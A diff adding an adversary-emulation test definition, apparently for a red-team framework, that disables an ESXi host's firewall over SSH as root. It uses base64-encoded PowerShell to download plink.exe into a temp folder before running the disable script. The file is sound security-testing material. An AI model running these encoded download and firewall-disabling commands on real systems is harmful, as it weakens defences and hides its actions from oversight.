@@ -1,0 +1,21 @@
+- id: 43a01a9a-f1d2-5853-94e8-daf21b89331f
+  name: Soumaia ART Tests - ESXi - Disable Firewall via Esxcli
+  description: Adversaries may disable the ESXI firewall via ESXCLI
+  tactic: defense-impairment
+  technique:
+    attack_id: T1686
+    name: Disable or Modify System Firewall
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAGwAaQBuAGsALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdABoAGUALgBlAGEAcgB0AGgALgBsAGkALwB+AHMAZwB0AGEAdABoAGEAbQAvAHAAdQB0AHQAeQAvAGwAYQB0AGUAcwB0AC8AdwA2ADQALwBwAGwAaQBuAGsALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHAAbABpAG4AawAuAGUAeABlACIACgA=
+          )
+          %TEMP%\ART-ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m .\esxi_disable_firewall.txt
+        cleanup: |-
+          %TEMP%\ART-ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m .\esxi_enable_firewall.txt
+        payloads:
+        - esxi_disable_firewall.txt
+        - esxi_enable_firewall.txt
